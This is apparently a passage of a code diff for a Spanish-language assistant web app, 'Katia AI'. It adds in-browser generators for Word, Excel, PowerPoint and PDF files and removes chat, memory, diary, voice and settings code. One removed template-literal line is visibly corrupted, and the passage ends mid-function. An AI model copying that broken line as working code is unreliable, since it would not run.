+  const doc = XML + '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>' +
+    '<w:p><w:r><w:rPr><w:b/><w:sz w:val="48"/></w:rPr><w:t>' + x(titulo) + '</w:t></w:r></w:p>' +
+    parrafosDocx(contenido) +
+    '<w:sectPr><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1134"/></w:sectPr>' +
+    '</w:body></w:document>';
+  return await zipCrear([
+    { nombre: '[Content_Types].xml', datos: XML + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>' },
+    { nombre: '_rels/.rels', datos: XML + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>' },
+    { nombre: 'word/document.xml', datos: doc }
+  ]);
 }
 
-function construirPromptV2(usuario){
- const nombreTexto = neutralizarMarcadores(usuario ? usuario : "(no informado)");
- const memoriasTexto = neutralizarMarcadores(memorias.slice(-15).join("\n") || "Sin recuerdos guardados.");
- const gustosTexto = neutralizarMarcadores(gustos.slice(-15).join("\n") || "Sin gustos guardados.");
- const diarioTexto = neutralizarMarcadores(diario.slice(-10).map(x=>x.text).join("\n") || "Sin entradas.");
+const COLORES = { purple:'7E22CE', blue:'1D4ED8', green:'15803D', gray:'4B5563' };
 
- return `Sos Katia AI, una asistente virtual cercana, inteligente y honesta.
-Hablás en español natural, cálido y claro. Tu nombre es Katia.
+async function xlsxCrear(contenido, estilo) {
+  const color = COLORES[estilo] || '7E22CE';
+  const filas = contenido.split('\n').map(l => l.trim()).filter(Boolean).map(l => l.split('|').map(c => c.trim()));
+  const celdas = filas.map((fila, r) => fila.map((v, c) => {
+    const ref = String.fromCharCode(65 + c) + (r + 1);
+    return '<c r="' + ref + '" t="inlineStr" s="' + (r === 0 ? 1 : 0) + '"><is><t>' + x(v) + '</t></is></c>';
+  }).join('')).map((f, i) => '<row r="' + (i + 1) + '">' + f + '</row>').join('');
+  const ancho = Math.max(...filas.map(f => f.length), 1);
 
-═══ REGLAS MAESTRAS (PRIORIDAD ABSOLUTA) ═══
-... (reglas completas de Brain V2 se mantienen igual que en la versión anterior) ...
-
-<<INICIO DE DATOS DEL USUARIO>>
-<usuario>${nombreTexto}</usuario>
-<memoria_importante>${memoriasTexto}</memoria_importante>
-<preferencias>${gustosTexto}</preferencias>
-<diario>${diarioTexto}</diario>
-<<FIN DE DATOS DEL USUARIO>>
-`;
+  return await zipCrear([
+    { nombre: '[Content_Types].xml', datos: XML + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/></Types>' },
+    { nombre: '_rels/.rels', datos: XML + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>' },
+    { nombre: 'xl/workbook.xml', datos: XML + '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Hoja1" sheetId="1" r:id="rId1"/></sheets></workbook>' },
+    { nombre: 'xl/_rels/workbook.xml.rels', datos: XML + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/></Relationships>' },
+    { nombre: 'xl/styles.xml', datos: XML + '<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><fonts count="2"><font><sz val="11"/><name val="Calibri"/></font><font><b/><color rgb="FFFFFFFF"/><sz val="11"/><name val="Calibri"/></font></fonts><fills count="3"><fill><patternFill patternType="none"/></fill><fill><patternFill patternType="gray125"/></fill><fill><patternFill patternType="solid"><fgColor rgb="FF' + color + '"/></patternFill></fill></fills><cellXfs count="2"><xf fontId="0" fillId="0"/><xf fontId="1" fillId="2" applyFont="1" applyFill="1"/></cellXfs></styleSheet>' },
+    { nombre: 'xl/worksheets/sheet1.xml', datos: XML + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><cols>' + Array.from({ length: ancho }, (_, i) => '<col min="' + (i + 1) + '" max="' + (i + 1) + '" width="24" customWidth="1"/>').join('') + '</cols><sheetData>' + celdas + '</sheetData></worksheet>' }
+  ]);
 }
 
-function construirPayloadChat(){
- const usuario = nombreUsuario();
- const contextoUsuario = brainV2Activo() ? construirPromptV2(usuario) : construirPromptV1(usuario);
- ultimoSystemPromptUsado = contextoUsuario;
- const recent = historial.slice(-20).map(item => ({
-  role: item.role === "assistant" ? "assistant" : "user",
-  content: item.content
- }));
- return {
-  messages: recent,
-  provider: obtenerProveedor(),
-  task: "chat",
-  context: contextoUsuario
- };
+const TEMAS = { purple:{ bg:'1A0B2E', fg:'FFFFFF', ac:'A855F7' }, blue:{ bg:'0B1B3A', fg:'FFFFFF', ac:'3B82F6' }, green:{ bg:'0C2416', fg:'FFFFFF', ac:'22C55E' }, dark:{ bg:'111827', fg:'F9FAFB', ac:'9CA3AF' }, light:{ bg:'FAFAFA', fg:'1F2937', ac:'7E22CE' } };
+
+function pptxSlide(theme, titulo, cuerpo, esPortada) {
+  const t = TEMAS[theme] || TEMAS.purple;
+  const cabecera = esPortada
+    ? '<p:sp><p:nvSpPr><p:cNvPr id="2" name="Titulo"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x="609600" y="2286000"/><a:ext cx="8229600" cy="1828800"/></a:xfrm></p:spPr><p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:rPr lang="es-AR" sz="4000" b="1"><a:solidFill><a:srgbClr val="' + t.fg + '"/></a:solidFill></a:rPr><a:t>' + x(titulo) + '</a:t></a:r></a:p></p:txBody></p:sp>'
+    : '<p:sp><p:nvSpPr><p:cNvPr id="2" name="Titulo"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x="609600" y="457200"/><a:ext cx="8229600" cy="914400"/></a:xfrm></p:spPr><p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:rPr lang="es-AR" sz="2800" b="1"><a:solidFill><a:srgbClr val="' + t.ac + '"/></a:solidFill></a:rPr><a:t>' + x(titulo) + '</a:t></a:r></a:p></p:txBody></p:sp>';
+  const cuerpoXml = cuerpo && cuerpo.length
+    ? '<p:sp><p:nvSpPr><p:cNvPr id="3" name="Cuerpo"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x="609600" y="1600200"/><a:ext cx="8229600" cy="4800600"/></a:xfrm></p:spPr><p:txBody><a:bodyPr wrap="square"/><a:lstStyle/>' +
+      cuerpo.map(l => '<a:p><a:pPr><a:buChar char="•"/></a:pPr><a:r><a:rPr lang="es-AR" sz="1800"><a:solidFill><a:srgbClr val="' + t.fg + '"/></a:solidFill></a:rPr><a:t>' + x(l) + '</a:t></a:r></a:p>').join('') +
+      '</p:txBody></p:sp>'
+    : '';
+  return XML + '<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:bg><p:bgPr><a:solidFill><a:srgbClr val="' + t.bg + '"/></a:solidFill><a:effectLst/></p:bgPr></p:bg><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/><a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>' + cabecera + cuerpoXml + '</p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr></p:sld>';
 }
 
-async function llamarWorker(options = {}){
- ultimoProveedorRespuesta = "";
- ultimoFallback = false;
- const {
-  messages = [],
-  provider = obtenerProveedor(),
-  task = "chat",
-  context = "",
-  instruction = "",
-  documentText = ""
- } = options;
-
- const body = {
-  messages: Array.isArray(messages) ? messages : [],
-  provider: ["auto","groq","gemini"].includes(provider) ? provider : "auto",
-  task: ["chat","document_analyze","document_question","document_modify","document_create"].includes(task) ? task : "chat"
- };
- if (context && typeof context === "string" && context.trim()) body.context = context.slice(0, 30000);
- if (instruction && typeof instruction === "string" && instruction.trim()) body.instruction = instruction.slice(0, 12000);
- if (documentText && typeof documentText === "string" && documentText.trim()) body.documentText = documentText.slice(0, 50000);
-
- const controller = new AbortController();
- const timeoutId = setTimeout(() => controller.abort(), 45000);
-
- try {
-  const response = await fetch(KATIA_API, {
-   method: "POST",
-   headers: { "Content-Type": "application/json" },
-   body: JSON.stringify(body),
-   signal: controller.signal
+async function pptxCrear(titulo, contenido, theme) {
+  const lineas = contenido.split('\n').map(l => l.replace(/^#+\s*/, '').trim()).filter(Boolean);
+  const slides = [{ titulo, cuerpo: [], portada: true }];
+  let actual = null;
+  lineas.forEach(l => {
+    if (l.length < 70 && !/[.]$/.test(l)) { actual = { titulo: l, cuerpo: [] }; slides.push(actual); }
+    else { if (!actual) { actual = { titulo: 'Desarrollo', cuerpo: [] }; slides.push(actual); } actual.cuerpo.push(l); }
   });
-  clearTimeout(timeoutId);
-  const data = await response.json().catch(() => ({}));
-  if (!response.ok) throw new Error(data?.error || ("Error del servidor: " + response.status));
-  if (data.error) throw new Error(data.error);
-  ultimoProveedorRespuesta = typeof data.provider === "string" ? data.provider : "";
-  ultimoFallback = data.fallback === true;
-  const resultado = data.reply || data.response || data.message;
-  if (typeof resultado !== "string" || !resultado.trim()) throw new Error("El servidor no devolvió una respuesta reconocible.");
-  return resultado.trim();
- } catch (err) {
-  clearTimeout(timeoutId);
-  if (err.name === "AbortError") throw new Error("Tiempo de espera agotado. Intentá de nuevo.");
-  throw err;
- }
+
+  const archivos = [
+    { nombre: '[Content_Types].xml', datos: XML + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/><Override PartName="/ppt/slideMasters/slideMaster1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/><Override PartName="/ppt/slideLayouts/slideLayout1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/>' + slides.map((_, i) => '<Override PartName="/ppt/slides/slide' + (i + 1) + '.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>').join('') + '</Types>' },
+    { nombre: '_rels/.rels', datos: XML + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/></Relationships>' },
+    { nombre: 'ppt/presentation.xml', datos: XML + '<p:presentation xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId1"/></p:sldMasterIdLst><p:sldIdLst>' + slides.map((_, i) => '<p:sldId id="' + (256 + i) + '" r:id="rId' + (i + 2) + '"/>').join('') + '</p:sldIdLst><p:sldSz cx="9144000" cy="6858000"/><p:notesSz cx="6858000" cy="9144000"/></p:presentation>' },
+    { nombre: 'ppt/_rels/presentation.xml.rels', datos: XML + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster1.xml"/>' + slides.map((_, i) => '<Relationship Id="rId' + (i + 2) + '" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide' + (i + 1) + '.xml"/>').join('') + '</Relationships>' },
+    { nombre: 'ppt/slideMasters/slideMaster1.xml', datos: XML + '<p:sldMaster xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/></p:spTree></p:cSld><p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/><p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/></p:sldLayoutIdLst></p:sldMaster>' },
+    { nombre: 'ppt/slideMasters/_rels/slideMaster1.xml.rels', datos: XML + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme1.xml"/></Relationships>' },
+    { nombre: 'ppt/slideLayouts/slideLayout1.xml', datos: XML + '<p:sldLayout xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" type="blank"><p:cSld name="Blank"><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/></p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr></p:sldLayout>' },
+    { nombre: 'ppt/slideLayouts/_rels/slideLayout1.xml.rels', datos: XML + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="../slideMasters/slideMaster1.xml"/></Relationships>' },
+    { nombre: 'ppt/theme/theme1.xml', datos: XML + '<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="K"><a:themeElements><a:clrScheme name="K"><a:dk1><a:srgbClr val="000000"/></a:dk1><a:lt1><a:srgbClr val="FFFFFF"/></a:lt1><a:dk2><a:srgbClr val="44546A"/></a:dk2><a:lt2><a:srgbClr val="E7E6E6"/></a:lt2><a:accent1><a:srgbClr val="A855F7"/></a:accent1><a:accent2><a:srgbClr val="EC4899"/></a:accent2><a:accent3><a:srgbClr val="67E8F9"/></a:accent3><a:accent4><a:srgbClr val="22C55E"/></a:accent4><a:accent5><a:srgbClr val="F59E0B"/></a:accent5><a:accent6><a:srgbClr val="EF4444"/></a:accent6><a:hlink><a:srgbClr val="0000FF"/></a:hlink><a:folHlink><a:srgbClr val="800080"/></a:folHlink></a:clrScheme><a:fontScheme name="K"><a:majorFont><a:latin typeface="Calibri"/></a:majorFont><a:minorFont><a:latin typeface="Calibri"/></a:minorFont></a:fontScheme><a:fmtScheme name="K"><a:fillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:fillStyleLst><a:lnStyleLst><a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln><a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln><a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln></a:lnStyleLst><a:effectStyleLst><a:effectStyle><a:effectLst/></a:effectStyle><a:effectStyle><a:effectLst/></a:effectStyle><a:effectStyle><a:effectLst/></a:effectStyle></a:effectStyleLst><a:bgFillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:bgFillStyleLst></a:fmtScheme></a:themeElements></a:theme>' }
+  ];
+  slides.forEach((s, i) => {
+    archivos.push({ nombre: 'ppt/slides/slide' + (i + 1) + '.xml', datos: pptxSlide(theme, s.titulo, s.cuerpo, s.portada) });
+    archivos.push({ nombre: 'ppt/slides/_rels/slide' + (i + 1) + '.xml.rels', datos: XML + '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/></Relationships>' });
+  });
+  return await zipCrear(archivos);
 }
 
-async function responderConIA(){
- return await llamarWorker(construirPayloadChat());
+function pdfEsc(s) { return String(s).replace(/\\/g, '\\\\').replace(/\(/g, '\\(').replace(/\)/g, '\\)'); }
+function cortar(s, max) {
+  const out = [];
+  let linea = '';
+  s.split(' ').forEach(p => {
+    if ((linea + ' ' + p).trim().length > max) { out.push(linea.trim()); linea = p; } else linea += ' ' + p;
+  });
+  if (linea.trim()) out.push(linea.trim());
+  return out;
 }
 
-async function enviarMensaje(){
- if(enviandoMensaje)return;
- const input=document.getElementById("userInput");
- const boton=document.getElementById("sendButton");
- const mic=document.getElementById("micButton");
- const texto=input.value.trim();
- if(!texto)return;
- enviandoMensaje=true;
- input.value="";
- input.disabled=true;
- boton.disabled=true;
- mic.disabled=true;
- agregarMensaje("user",texto);
- mostrarTyping();
- estadoOrb("thinking","🧠 Katia está pensando...");
- try{
-  const respuesta=await responderConIA();
-  quitarTyping();
-  agregarMensaje("katia",respuesta,true,{provider:ultimoProveedorRespuesta,fallback:ultimoFallback});
-  estadoOrb("","🟢 En línea · Lista para hablar");
- }catch(error){
-  quitarTyping();
-  agregarMensaje("katia","Tuve un problema al conectarme con mi cerebro. 💜\n\nRevisá tu conexión o el Worker e intentá nuevamente.\n\nDetalle: "+error.message);
-  estadoOrb("","⚠️ Problema de conexión");
-  console.error(error);
- }finally{
-  enviandoMensaje=false;
-  input.disabled=false;
-  boton.disabled=false;
-  mic.disabled=false;
-  input.focus();
- }
-}
+function pdfCrear(titulo, contenido) {
+  const paginas = [];
+  let ops = ['BT', '/F1 18 Tf', '50 790 Td', '(' + pdfEsc(titulo) + ') Tj', '/F1 11 Tf', '0 -28 Td'];
+  let y = 762;
+  contenido.split('\n').map(l => l.replace(/^#+\s*/, '').trim()).filter(Boolean).forEach(l => {
+    cortar(l, 92).forEach(sub => {
+      if (y < 60) { ops.push('ET'); paginas.push(ops.join('\n')); ops = ['BT', '/F1 11 Tf', '50 790 Td']; y = 762; }
+      ops.push('(' + pdfEsc(sub) + ') Tj', '0 -16 Td'); y -= 16;
+    });
+  });
+  ops.push('ET');
+  paginas.push(ops.join('\n'));
 
-document.getElementById("userInput").addEventListener("keydown",e=>{
- if(e.key==="Enter")enviarMensaje();
-});
+  const objs = [];
+  const nPag = paginas.length;
+  objs[1] = '<< /Type /Catalog /Pages 2 0 R >>';
+  objs[2] = '<< /Type /Pages /Count ' + nPag + ' /Kids [' + paginas.map((_, i) => (4 + i * 2) + ' 0 R').join(' ') + '] >>';
+  objs[3] = '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>';
+  paginas.forEach((p, i) => {
+    objs[4 + i * 2] = '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 3 0 R >> >> /Contents ' + (5 + i * 2) + ' 0 R >>';
+    objs[5 + i * 2] = '<< /Length ' + p.length + ' >>\nstream\n' + p + '\nendstream';
+  });
 
-function saludar(){
- document.getElementById("userInput").value="Hola Katia, ¿cómo estás hoy?";
- enviarMensaje();
-}
-
-function limpiarChat(){
- if(!confirm("¿Querés borrar el historial de conversación?"))return;
- historial=[];
- guardar(STORAGE.history,historial);
- restaurarHistorial();
- ultimoMensaje="";
-}
-
-/* MEMORIA / DIARIO / GUSTOS (sin cambios de lógica) */
-function abrirMemoria(){
- document.getElementById("panelContent").innerHTML=`
- <p>🧠 Recuerdos guardados de Katia.</p>
- <textarea id="memoryInput" placeholder="Escribí algo que Katia debería recordar..."></textarea>
- <button class="action" onclick="guardarMemoria()">Guardar recuerdo</button>
- <div id="memoryList"></div>`;
- mostrarMemorias();
-}
-function guardarMemoria(){
- const input=document.getElementById("memoryInput");
- const texto=input.value.trim();
- if(!texto)return;
- memorias.push(texto);
- guardar(STORAGE.memories,memorias);
- input.value="";
- mostrarMemorias();
- actualizarPerfil();
-}
-function mostrarMemorias(){
- const list=document.getElementById("memoryList");
- if(!list)return;
- list.innerHTML="<h3>Recuerdos</h3>";
- memorias.forEach((item,index)=>{
-  const div=document.createElement("div");
-  div.style.padding="10px";
-  div.style.borderBottom="1px solid #ffffff22";
-  div.textContent=item;
-  const btn=document.createElement("button");
-  btn.textContent="Eliminar";
-  btn.className="tool-btn";
-  btn.style.marginTop="7px";
-  btn.onclick=()=>{memorias.splice(index,1);guardar(STORAGE.memories,memorias);mostrarMemorias();actualizarPerfil();};
-  div.append(document.createElement("br"),btn);
-  list.appendChild(div);
- });
-}
-
-function abrirDiario(){
- document.getElementById("panelContent").innerHTML=`
- <p>📖 Tu diario personal.</p>
- <textarea id="diaryInput" placeholder="Escribí una nueva entrada..."></textarea>
- <button class="action" onclick="guardarDiario()">Guardar entrada</button>
- <div id="diaryList"></div>`;
- mostrarDiario();
-}
-function guardarDiario(){
- const input=document.getElementById("diaryInput");
- const texto=input.value.trim();
- if(!texto)return;
- diario.push({text:texto,date:new Date().toLocaleString()});
- guardar(STORAGE.diary,diario);
- input.value="";
- mostrarDiario();
- actualizarPerfil();
-}
-function mostrarDiario(){
- const list=document.getElementById("diaryList");
- if(!list)return;
- list.innerHTML="<h3>Entradas</h3>";
- diario.slice().reverse().forEach(item=>{
-  const div=document.createElement("div");
-  div.style.padding="12px";
-  div.style.borderBottom="1px solid #ffffff22";
-  const date=document.createElement("small");
-  date.textContent=item.date;
-  const content=document.createElement("p");
-  content.textContent=item.text;
-  div.append(date,content);
-  list.appendChild(div);
- });
-}
-
-function abrirGustos(){
- document.getElementById("panelContent").innerHTML=`
- <p>✨ Cosas que te gustan.</p>
- <textarea id="likeInput" placeholder="Agregá algo que te guste..."></textarea>
- <button class="action" onclick="guardarGusto()">Guardar gusto</button>
- <div id="likesList"></div>`;
- mostrarGustos();
-}
-function guardarGusto(){
- const input=document.getElementById("likeInput");
- const texto=input.value.trim();
- if(!texto)return;
- gustos.push(texto);
- guardar(STORAGE.likes,gustos);
- input.value="";
- mostrarGustos();
-}
-function mostrarGustos(){
- const list=document.getElementById("likesList");
- if(!list)return;
- list.innerHTML="<h3>Mis gustos</h3>";
- gustos.forEach((item,index)=>{
-  const div=document.createElement("div");
-  div.style.padding="10px";
-  div.style.borderBottom="1px solid #ffffff22";
-  div.textContent=item;
-  const btn=document.createElement("button");
-  btn.className="tool-btn";
-  btn.textContent="Eliminar";
-  btn.onclick=()=>{gustos.splice(index,1);guardar(STORAGE.likes,gustos);mostrarGustos();};
-  div.append(document.createElement("br"),btn);
-  list.appendChild(div);
- });
-}
-
-/* VOZ */
-function cargarVocesDisponibles(){
- const todas = (window.speechSynthesis && speechSynthesis.getVoices) ? speechSynthesis.getVoices() : [];
- vocesDisponibles = todas.filter(v => /^es/i.test(v.lang || ""));
- return vocesDisponibles.length > 0;
-}
-function buscarVozPorURI(uri){
- if(!uri) return null;
- return vocesDisponibles.find(v => v.voiceURI === uri) || null;
-}
-function seleccionarVozPorDefecto(){
- const prioridades = ["es-PY","es-AR","es-US","es-MX","es-ES"];
- for(const lang of prioridades){
-  const encontrada = vocesDisponibles.find(v => (v.lang||"").toLowerCase() === lang.toLowerCase());
-  if(encontrada) return encontrada;
- }
- return vocesDisponibles[0] || null;
-}
-function obtenerVozActiva(){
- if(!vocesDisponibles.length) return null;
- if(vozSeleccionadaURI){
-  const guardada = buscarVozPorURI(vozSeleccionadaURI);
-  if(guardada) return guardada;
- }
- return seleccionarVozPorDefecto();
-}
-function guardarVoz(){
- const selector = document.getElementById("voiceSelect");
- if(!selector) return;
- const valor = selector.value;
- if(valor === ""){
-  vozSeleccionadaURI = "";
-  localStorage.removeItem(STORAGE.voice);
- }else{
-  vozSeleccionadaURI = valor;
-  localStorage.setItem(STORAGE.voice, valor);
- }
- actualizarVozVisible();
- alert("Voz guardada. Se aplicará en el próximo mensaje.");
-}
-function actualizarVozVisible(){
- const elemento = document.getElementById("voiceStatus");
- if(!elemento) return;
- const voz = obtenerVozActiva();
- if(!voz){
-  elemento.textContent = "🎙️ Voz: automática del navegador";
-  return;
- }
- elemento.textContent = "🎙️ Voz: " + (voz.name || "(sin nombre)") + " · " + (voz.lang || "");
-}
-function probarVozSeleccionada(){
- if(!("speechSynthesis" in window)){alert("Tu navegador no permite reproducir voz.");return;}
- const selector = document.getElementById("voiceSelect");
- const uri = selector ? selector.value : "";
- const voz = uri ? buscarVozPorURI(uri) : seleccionarVozPorDefecto();
- speechSynthesis.cancel();
- const utterance = new SpeechSynthesisUtterance("¡Hola! Así se va a escuchar la voz de Katia. ¿Te gusta?");
- utterance.rate = 1; utterance.pitch = 1.0; utterance.volume = 1;
- if(voz){utterance.voice = voz;utterance.lang = voz.lang;}else{utterance.lang = "es-ES";}
- utterance.onstart = () => estadoOrb("speaking","🔊 Probando voz...");
- utterance.onend = () => estadoOrb("","🟢 En línea · Lista para hablar");
- utterance.onerror = () => estadoOrb("","🟢 En línea");
- speechSynthesis.speak(utterance);
-}
-function mostrarSelectorVoces(){
- const contenedor = document.getElementById("voiceSelectContainer");
- if(!contenedor) return;
- if(!vocesDisponibles.length) cargarVocesDisponibles();
- if(!vocesDisponibles.length){
-  contenedor.innerHTML = '<div class="provider-info">Cargando voces del dispositivo...</div>';
-  return;
- }
- const opciones = vocesDisponibles.map(v => {
-  const uri = v.voiceURI || "";
-  const seleccionada = (uri === vozSeleccionadaURI) ? " selected" : "";
-  return `<option value="\( {uri.replace(/"/g,'&quot;')}" \){seleccionada}>${v.name||"(sin nombre)"} · ${v.lang||""}</option>`;
- }).join("");
- contenedor.innerHTML = `
-  <select id="voiceSelect">
-   <option value="">Automática (recomendada)</option>
-   ${opciones}
-  </select>
-  <button class="action" onclick="probarVozSeleccionada()">🔊 Probar voz</button>
-  <button class="action" onclick="guardarVoz()">💾 Guardar voz</button>
- `;
-}
-
-/* CONFIGURACIÓN */
-function abrirConfiguracion(){
- const proveedor=obtenerProveedor();
- const brainV2 = brainV2Activo();
- document.getElementById("panelContent").innerHTML=`
- <h3>⚙️ Configuración</h3>
- <label>¿Cómo querés que te llame Katia?</label>
- <input id="userNameInput" placeholder="Tu nombre">
- <button class="action" onclick="guardarNombre()">Guardar nombre</button>
- <hr style="border-color:#ffffff22;margin:20px 0">
- <div class="provider-box">
-  <label>🧠 Proveedor de inteligencia artificial</label>
-  <select id="providerSelect">
-   <option value="auto">Automático (Groq + Gemini)</option>
-   <option value="groq">Groq</option>
-   <option value="gemini">Gemini</option>
-  </select>
-  <button class="action" onclick="guardarProveedor()">Guardar proveedor</button>
-  <div class="provider-info">Automático usa el sistema de selección y respaldo del Worker.</div>
- </div>
- <hr style="border-color:#ffffff22;margin:20px 0">
- <div class="provider-box">
-  <label>🧠 Cerebro de Katia</label>
-  <select id="brainV2Select">
-   <option value="off">Katia 3.1 (V1) — original</option>
-   <option value="on">Brain V2 — experimental</option>
-  </select>
-  <button class="action" onclick="guardarBrainV2()">Guardar cerebro</button>
-  <button class="action" onclick="verSystemPromptUsado()">🔍 Ver último system preparado</button>
- </div>
- <hr style="border-color:#ffffff22;margin:20px 0">
- <div class="provider-box">
-  <label>🎙️ Voz de Katia</label>
-  <div id="voiceSelectContainer"><div class="provider-info">Cargando voces...</div></div>
- </div>
- <hr style="border-color:#ffffff22;margin:20px 0">
- <button class="action" onclick="exportarDatos()">📥 Exportar mis datos</button>
- `;
- document.getElementById("userNameInput").value=nombreUsuario();
- document.getElementById("providerSelect").value=proveedor;
- document.getElementById("brainV2Select").value = brainV2 ? "on" : "off";
- mostrarSelectorVoces();
-}
-
-function guardarNombre(){
- localStorage.setItem(STORAGE.username, document.getElementById("userNameInput").value.trim());
- alert("Nombre guardado 💜");
- actualizarPerfil();
-}
-
-function abrirPanel(tipo){
- const overlay=document.getElementById("overlay");
- const title=document.getElementById("panelTitle");
- overlay.classList.add("open");
- if(tipo==="memory"){title.textContent="🧠 Memoria";abrirMemoria();}
- else if(tipo==="diary"){title.textContent="📖 Diario";abrirDiario();}
